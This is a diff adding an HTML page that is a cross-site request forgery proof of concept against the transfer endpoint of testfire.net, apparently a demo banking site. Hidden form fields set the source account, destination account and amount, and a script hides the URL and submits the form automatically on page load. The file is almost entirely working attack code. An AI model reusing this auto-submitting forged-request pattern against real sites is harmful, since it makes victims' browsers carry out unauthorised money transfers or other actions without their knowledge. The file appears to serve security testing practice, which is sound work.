@@ -1,0 +1,15 @@
+﻿<html>
+	<body>
+		<form method="POST" action="http://testfire.net/bank/doTransfer">
+			<input type="hidden" name="fromAccount" value="800000" />
+			<input type="hidden" name="toAccount" value="800006" />
+			<input type="hidden" name="transferAmount" value="5400" />
+			<input type="hidden" name="transfer" value="Transfer&#32;Money" />
+      
+		</form>
+		<script>
+			history.pushState('', '', '/');
+			document.forms[0].submit();
+		</script>
+	</body>
+<html>
